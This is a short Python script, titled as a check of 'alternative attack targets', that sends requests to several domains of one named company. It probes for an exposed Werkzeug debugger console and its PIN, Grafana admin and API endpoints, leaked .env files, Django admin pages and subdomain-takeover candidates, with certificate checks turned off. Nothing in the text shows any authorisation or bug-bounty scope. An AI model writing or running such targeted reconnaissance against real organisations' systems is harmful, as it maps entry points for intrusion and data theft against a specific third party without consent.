#!/usr/bin/env python3
"""Check alternative attack targets"""
import urllib3
urllib3.disable_warnings()
import requests

s = requests.Session()
s.verify = False
s.timeout = 10

# 1. Werkzeug debugger on www.pasarpolis.com
print("=== WERKZEUG DEBUGGER CHECK ===")
werkzeug_paths = [
    "/console", "/console/",
    "/?__debugger__=yes&cmd=resource&f=debugger.js",
    "/?__debugger__=yes&cmd=printpin",
    "/debug", "/debugger",
    "/?__debugger__=yes&cmd=resource&f=console.png"
]
for path in werkzeug_paths:
    try:
        r = s.get(f"https://www.pasarpolis.com{path}", allow_redirects=False)
        print(f"{r.status_code:3d} {path:60s} | {r.headers.get('content-type','?')[:30]} | {r.text[:80]}")
    except Exception as e:
        print(f"ERR {path}: {e}")

# Check headers
print("\n=== WWW.PASARPOLIS.COM HEADERS ===")
try:
    r = s.get("https://www.pasarpolis.com/", allow_redirects=False)
    for h, v in r.headers.items():
        print(f"  {h}: {v}")
    print(f"  Body preview: {r.text[:200]}")
except Exception as e:
    print(f"Error: {e}")

# 2. Grafana
print("\n=== GRAFANA 9.4.3 CHECK ===")
grafana_paths = [
    "/api/health", "/api/org", "/api/admin/settings",
    "/api/ds/query", "/api/snapshots", "/api/annotations",
    "/public/build/", "/login", "/api/login/ping",
    "/api/user", "/api/users", "/api/dashboards/home",
    "/.env", "/robots.txt"
]
for path in grafana_paths:
    try:
        r = s.get(f"https://www.monitoring.pasarpolis.com{path}", allow_redirects=False)
        print(f"{r.status_code:3d} {path:40s} | {r.text[:100]}")
    except Exception as e:
        print(f"ERR {path}: {e}")

# 3. ava.pasarpolis.io /admin/
print("\n=== AVA ADMIN CHECK ===")
ava_paths = [
    "/admin/", "/admin/login/", "/admin/auth/",
    "/api/", "/api/v1/", "/.env", "/admin/doc/",
    "/admin/jsi18n/", "/admin/logout/",
    "/admin/password_change/", "/static/admin/",
    "/robots.txt", "/health", "/healthz"
]
for path in ava_paths:
    try:
        r = s.get(f"https://ava.pasarpolis.io{path}", allow_redirects=False)
        ct = r.headers.get('content-type','?')[:30]
        body = r.text[:100].replace('\n',' ').strip()
        print(f"{r.status_code:3d} {path:35s} | {ct} | {body}")
    except Exception as e:
        print(f"ERR {path}: {e}")

# 4. Subdomain takeover check
print("\n=== SUBDOMAIN TAKEOVER CHECK ===")
for domain in ["mitra-app.pasarpolis.com", "pp-app.pasarpolis.com"]:
    try:
        r = s.get(f"https://{domain}/", allow_redirects=False)
        print(f"{r.status_code:3d} {domain} | {r.text[:200]}")
    except Exception as e:
        print(f"ERR {domain}: {e}")
